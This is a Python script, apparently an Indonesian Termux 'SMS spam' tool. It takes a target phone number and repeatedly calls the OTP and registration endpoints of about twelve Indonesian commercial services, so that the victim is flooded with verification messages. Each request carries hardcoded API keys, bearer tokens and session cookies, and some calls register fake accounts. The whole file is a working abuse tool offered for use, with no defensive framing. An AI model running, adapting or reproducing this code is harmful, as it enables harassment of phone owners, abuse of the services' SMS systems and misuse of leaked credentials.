# Jangan lupa subrek
# Min Jangan Recode
# Di katain jangan ya jangan
# eh lu anak siapa sih gg amat
# gw ajarin sampe pala lu botak
import os,sys,time,requests,re,json,random
from random import randrange as rg
from getpass import getpass

print ("\033[00m")
def clear():
    os.system("clear")
    f=input("\t[enter to back]")
def balik():
    if f == "":
       os.system("python spam.py")
    else:
       sys.exit()

def kata(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./200)

def mengetik(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.2)

def jenius():
    ua={
    "accept": "*/*",
    "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
    "version": "2.36.1-7565",
    "accept-language": "id",
    "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
    "Content-Type": "application/json",
    "Host": "api.btpn.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607",
    "User-Agent": "okhttp/3.12.1"
    }
    dat=json.dumps({"query":"mutation registerPhone($phone: String!, $language: Language!) {\n  registerPhone(input: {phone: $phone, language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables":{"phone":w,"language":"id"},"operationName":"registerPhone"})
    r=requests.post("https://api.btpn.com/jenius", data=dat, headers=ua).text
def rupa():
     ua={
     "Host": "wapi.ruparupa.com",
     "Connection": "keep-alive",
     "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
     "Accept": "application/json",
     "Content-Type": "application/json",
     "X-Company-Name": "odi",
     "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
     "user-platform": "mobile",
     "X-Frontend-Type": "mobile",
     "Origin": "https://m.ruparupa.com",
     "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
     "Accept-Encoding": "gzip, deflate, br",
     "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
     }
     dat=json.dumps({"phone":no,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0})
     r = requests.post("https://wapi.ruparupa.com/auth/generate-otp", data=dat, headers=ua).text
def mapclub():
    ua={
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
def oyo():
    ua={
    "Host": "identity-gateway.oyorooms.com",
    "consumer_host": "https://www.oyorooms.com",
    "accept-language": "id",
    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "accept": "*/*",
    "origin": "https://www.oyorooms.com",
    "referer": "https://www.oyorooms.com/login",
    "Accept-Encoding": "gzip, deflate, br",
    }
    dat=json.dumps({"phone":c,"country_code":"+62","country_iso_code":"ID","nod":"4","send_otp":"true","devise_role":"Consumer_Guest"})
    r = requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", data=dat, headers=ua).text
def depop():
    ua={
    "Host": "webapi.depop.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat=json.dumps({"phone_number":no,"country_code":"ID"})
    r = requests.put("https://webapi.depop.com/api/auth/v1/verify/phone", data=dat, headers=ua)
def soplai():
    ua={
    "Host": "api.sooplai.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "origin": "https://www.sooplai.com",
    "referer": "https://www.sooplai.com/register",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://api.sooplai.com/customer/register/otp/request", data=dat, headers=ua)
def call():
    head = {
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
    "Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
    "Content-Type": "application/json",
    "Origin": "https://id.jagreward.com",
    "Referer": "https://id.jagreward.com/member/register/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
    "_ga": "GA1.2.2037151396.1584709855",
    "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
    "DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
    }
    r = requests.get("https://id.jagreward.com/member/verify-mobile/"+c+"/", headers=head)
def call2():
    ua={
    "Content-Type": "application/json",
    "Host": "srv3.sampingan.co.id",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.4.0"
    }
    dat=json.dumps({"countryCode":"+62","phoneNumber":c})
    r=requests.post("https://srv3.sampingan.co.id/auth/generate-otp", data=dat, headers=ua)
def alodoc():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def olx():
    req=requests.post("https://www.olx.co.id/api/auth/authenticate", json={"grantType":"phone","phone":w,"language":"id"}).json()
def matahari():
     heder = {'Host': 'thor.matahari.com',
              'content-length': '230',
              'modulecode': 'MR',
              'origin': 'https://www.matahari.com',
              'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2R1bGVDb2RlIjoiTVIiLCJ1c2VyVHlwZSI6IjEiLCJleHAiOjE1NDM2NjA5MDYsInVzZXJOYW1lIjoiS0Zpb2ViMWhveU9FRDBERWQiLCJ1c2VySWQiOiJwcm9kdWN0aW9uNDYxOTAyNjQ0NSIsImp0aSI6IjFmMjI3NzE5LTY4OTMtNDhjYy1iNmQzLWY2OTkzMWMzMDIwYSIsImlhdCI6MTU0MzY1NzMwNn0.6XdrUX9QzD0Ld2eOJep7QnSwVjfFyjq-v7P4w0lGG9M',
              'content-type': 'application/json',
              'accept': 'application/json, text/plain, */*',
              'clientid': 'mds_mweb',
              'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
              'sessionid': '1595084426451',
              'save-data': 'on',
              'referer': 'https://www.matahari.com/register',
              'accept-encoding': 'gzip, deflate, br',
              'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6'}

     data = {'emailAddress': 'noobie@mail.com',
             'firstName': 'Noobie',
             'lastName': 'Gans',
             'mobileNumber': no,
             'mccCardNumber': '',
             'password': 'asecc123',
             'referralCode': '',
             'dateOfBirth': '09-05-1993',
             'gender': 'Male',
             'registrationType': 'N'}
     sec = requests.post('https://thor.matahari.com/MatahariMobileAPI/register', headers=heder, json=data)
def socil():
    headreg={
    "Host": "soco-api.sociolla.com",
    "Connection": "keep-alive",
    "Sec-Fetch-Mode": "cors",
    "Origin": "https://www.sociolla.com",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.06.4.5042",
    "Content-Type": "application/json;charset\u003dUTF-8",
    "Accept": "application/json, text/plain, */*",
    "session_id": "c970c955-79d1-45fd-840c-9082650a7a89",
    "SOC-PLATFORM": "sociolla-web-mobile",
    "Sec-Fetch-Site": "same-site",
    "Referer": "https://www.sociolla.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7",
    }

    ses=requests.Session()
    reg=ses.post("https://soco-api.sociolla.com/auth/register",json={"acquisition_source":"sociolla-web-mobile","email":f"noobie{rg(9999)}@mail.com","user_name":f"noobiegans{rg(9999)}","password":f"noobie{rg(9999)}","first_name":f"Noobie{rg(999)}","last_name":f"Gans{rg(999)}","gender":"Male","salute":"Mr","phone_no":no}, headers=headreg)
    token=reg.json()['data']['token']
    headotp={
    "Host": "soco-api.sociolla.com",
    "Connection": "keep-alive",
    "Sec-Fetch-Mode": "cors",
    "Origin": "https://www.sociolla.com",
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json;charset\u003dUTF-8",
    "Accept": "application/json, text/plain, */*",
    "session_id": "c970c955-79d1-45fd-840c-9082650a7a89",
    "SOC-PLATFORM": "sociolla-web-mobile",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.06.4.5042",
    "Sec-Fetch-Site": "same-site",
    "Referer": "https://www.sociolla.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7",
    }
    rotp=ses.post("https://soco-api.sociolla.com/auth/otp/code", json={"mode":"sms","entity":"phone_no"}, headers=headotp).json()
def klik():
    dat={'number':no}
    r=requests.post("https://nuubi.herokuapp.com/api/spam/klikdok", data=dat)
def indo():
    ua={
    "Host": "account-api-v1.klikindomaret.com",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "content-type": "application/json",
    "accept": "*/*",
    "origin": "https://account.klikindomaret.com",
    "referer": "https://account.klikindomaret.com/SMSVerification?nohp="+no+"&type=register",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
    r=requests.get("https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP="+no, headers=ua).text
def wa2():
    name="Danz"+str(random.randrange(11,99999))
    pas="termux"+str(random.randrange(111,999))
    ua={
    "Host": "qtva.id",
    "Connection": "keep-alive",
    "Accept": "text/html, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://qtva.id",
    "Referer": "https://qtva.id/page/register/siswa",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cookie": "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1"}
    dat={
    "namaDepan":name,
    "emailNope":no,
    "password":pas,
    "konfirmasiPass":pas
    }
    r=requests.post("https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==", data=dat, headers=ua).text

if __name__=="__main__":
    try:

          clear()
          hh="+62"
          print("\033[33m══════════════════════════════════════════════════════════════\033[33m\033[32")
          print("\033[35m[\033[35m\033[37m+\033[37m\033[35m]\033[35m \033[31m[\033[31m\033[32m𝙈𝘼𝙎𝙐𝙆𝘼𝙉 𝙉𝙊𝙈𝙊𝙍 08XXX\033[32m")
          no=input("\033[35m[\033[35m\033[37m+\033[37m\033[35m]\033[35m \033[31m[\033[31m\033[32m𝙈𝘼𝙎𝙐𝙆𝘼𝙉 𝙉𝙊𝙈𝙊𝙍 𝙏𝘼𝙍𝙂𝙀𝙏\033[32m\033[31m]\033[31m\033[37m :\033[37m\033[33m\033[33m ")
          kata("\033[33m═══════════════════════════════════════════════════════════════\033[33m\033[32")
          time.sleep(5)
          print("\033[33m════════════════════════════════════════════════════════════════\033[33m\033[32")
          mengetik("\033[32m SUBSCRIBE DULUH YT Bang Dhan BIAR WORK \033[32m")
          time.sleep(5)
          os.system('clear')
          os.system('xdg-open https://youtube.com/channel/UCoxLR7R7bo68wIO-btK0GnA')
          print("""
\033[1;96m  ╔═════════════════════════════════════════╗
\033[1;96m  ║\033[1;95m ____  ____  ____  __  __  __  __  _  _  \033[1;96m║
\033[1;96m  ║\033[1;95m(_  _)( ___)(  _ \(  \/  )(  )(  )( \/ ) \033[1;96m║
\033[1;96m  ║\033[1;95m  )(   )__)  )   / )    (  )(__)(  )  (  \033[1;96m║
\033[1;96m  ║\033[1;95m (__) (____)(_)\_)(_/\/\_)(______)(_/\_) \033[1;96m║
\033[1;96m  ║            TOOLS BY DHANZ MAKER        ║
\033[1;96m  ╚═════════════════════════════════════════╝
\033[1;96m╔══════════════════════════════════════════════════╗\033[96m
\033[1;95m║\033[95m[\033[1;90m•\033[1;95m]\033[1;96m Creator\033[1;93m: \033[1;92mDhanz.Maker      
\033[1;95m║\033[95m[\033[1;90m•\033[1;95m]\033[1;96m Github\033[1;93m : \033[1;92mChanel YT Bang Dhan                    
\033[1;95m║\033[95m[\033[1;90m•\033[1;95m]\033[1;96m Status\033[1;93m : \033[1;92mSelalu Online                    
\033[1;95m║\033[95m[\033[1;90m•\033[1;95m]\033[1;96m Version\033[1;93m: \033[1;92mv2.5.1                    
\033[1;95m║\033[95m[\033[1;90m•\033[1;95m]\033[1;96m Waktu\033[1;93m  : \033[1;92m2022)                     
\033[1;96m╚══════════════════════════════════════════════════╝
              \033[94m╔═══════════════════════════╗\033[94m
              \033[94m║\033[94m\033[31m[\033[31m\033[32mTools menu by Dhanz Maker\033[32m\033[31m]\033[31m\033[94m║\033[94m
  \033[94m        ╔═══════════════════════════════════╗\033[94m
          ║                                   ║
  \033[33m╔═════════════════════════╦══════════════════════════════╗\033[33m
  \033[33m║\033[33m  \033[36m𝟭\033[36m.\033[31m[\033[31m\033[32m𝗦𝗽𝗮𝗺 𝗦𝗺𝘀\033[32m\033[31m]\033[31m \033[35m𝗝𝗲𝗻𝗶𝘂𝘀\033[35m    \033[33m║\033[33m  \033[36m𝟳\033[36m.\033[31m[\033[31m\033[32m𝗦𝗽𝗮𝗺 𝗦𝗺𝘀\033[32m\033[31m]\033[31m\033[35m 𝗔𝗹𝗼𝗱𝗼𝗸\033[35m         \033[33m║\033[33m
  \033[33m║\033[33m \033[36m 𝟮\033[36m.\033[31m[\033[31m\033[32m𝙎𝙥𝙖𝙢 𝙎𝙢𝙨\033[32m\033[31m]\033[31m \033[35m𝙍𝙪𝙥𝙖-𝙧𝙪𝙥𝙖\033[35m \033[33m║\033[33m  \033[36m𝟴\033[36m.\033[31m[\033[31m\033[32m𝗦𝗽𝗮𝗺 𝗦𝗺𝘀\033[32m\033[31m]\033[31m \033[35m𝗢𝗹\033[35m             \033[33m║\033[33m
  \033[33m║\033[33m \033[36m 𝟯\033[36m.\033[31m[\033[31m\033[32m𝗦𝗽𝗮𝗺 𝗦𝗺𝘀\033[32m\033[31m]\033[31m\033[35m 𝗠𝗮𝗽𝗰𝗹𝘂𝗯\033[38m   \033[33m║\033[33m \033[36m 𝟵\033[36m.\033[31m[\033[31m\033[32m𝗦𝗽𝗮𝗺 𝗦𝗺𝘀\033[32m\033[31m]\033[31m\033[35m 𝗠𝗮𝘁𝗮𝗵𝗮𝗿𝗶\033[35m       \033[33m║\033[33m
  \033[33m║\033[33m \033[36m 4\033[36m.\033[31m[\033[31m\033[32m𝙎𝙥𝙖𝙢 𝙎𝙢𝙨\033[32m\033[31m]\033[31m\033[35m 𝙊𝙮𝙤 \033[35m      \033[33m║\033[33m  \33[36m𝟭𝟬\033[36m.\033[31m[\033[31m\033[32m𝗦𝗽𝗮𝗺 𝗦𝗺𝘀\033[32m\033[31m]\033[31m \033[35m𝗦𝗼𝗰𝗶𝗼𝗹𝗹𝗮\033[35m      \033[33m║\033[33m
  \033[33m║\033[33m \033[36m 𝟱\033[36m.\033[31m\033[31m[\033[31m\033[32m𝗦𝗽𝗮𝗺 𝗦𝗺𝘀\033[32m\033[31m]\033[35m 𝗗𝗲𝗽𝗼𝗽\033[35m     \033[33m║\033[33m  \033[36m𝟭𝟭\033[36m.\033[31m[\033[31m\033[32m𝗦𝗽𝗮𝗺 𝗦𝗺𝘀\033[32m\033[31m]\033[31m\033[35m 𝗛𝗲𝗿𝗼𝗸𝘂𝗮𝗽𝗽\033[35m     \033[33m║\033[33m
  \033[33m║\033[33m \033[36m 𝟲\033[36m.\033[31m[\033[31m\033[31m\033[32m𝗦𝗽𝗮𝗺 𝗦𝗺𝘀\033[32m\033[31m]\033[31m\033[35m 𝗦𝗼𝗽𝗹𝗮𝗶\033[35m    \033[33m║\033[33m  \033[36m𝟭𝟮\033[36m.\033[31m[\033[31m\033[32m𝗦𝗽𝗮𝗺 𝗦𝗺𝘀\033[32m\033[31m]\033[35m 𝗜𝗻𝗱𝗼𝗺𝗮𝗿𝗲𝘁     \033[33m║\033[33m
  \033[33m╚═════════════════════════╩══════════════════════════════╝\033[33m
\033[94m════════════════════════════════════════════════════════════════\033[94m

          """)
          jns=input("\033[35m[\033[35m\033[32m𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗽𝗶𝗹𝗶𝗵𝗮𝗻 𝗮𝗻𝗱𝗮\033[32m\033[35m]\033[35m\033[37m :\033[37m \033[94m\033[94m")
          c=no[1:12]
          w=hh+c
          kata("\033[33mProgram Spam Berjalan\033[33m....!!\033[31mKlik Ctrl+C untuk Stop\033[31m")
          if jns == "1":
              while True:
                  jenius()
                  time.sleep(2)
          elif jns == "2":
              while True:
                  rupa()
                  time.sleep(2)
          elif jns == "3":
              while True:
                  mapclub()
                  time.sleep(2)
          elif jns == "4":
              while True:
                  oyo()
                  time.sleep(2)
          elif jns == "5":
              while True:
                  depop()
                  time.sleep(2)
          elif jns == "6":
              while True:
                  soplai()
                  time.sleep(2)
          elif jns == "7":
              while True:
                  alodoc()
                  time.sleep(2)
          elif jns == "8":
              while True:
                  olx()
                  time.sleep(2)
          elif jns == "9":
              while True:
                  matahari()
                  time.sleep(2)
          elif jns == "10":
              while True:
                  socil()
                  time.sleep(2)
          elif jns == "11":
              while True:
                  klik()
                  time.sleep(2)
          elif jns == "12":
              while True:
                  indo()
                  time.sleep(2)
          mengetik("\033[31m[\033[31m\033[37m•\033[37m\033\31m]\033[31m\033[32mSelesai\033[32m\033[37m..\033[37m")
    except KeyError:
          sys.exit()
    except KeyboardInterrupt:
          sys.exit("\033[32mSPAM DI BERHENTIKAN\033[32m")
    except requests.exceptions.ConnectionError:
          sys.exit('\033[32mCEK KONEKSI ANDAH\033[32m')
    except TypeError:
          balik()
    except ValueError:
          balik()
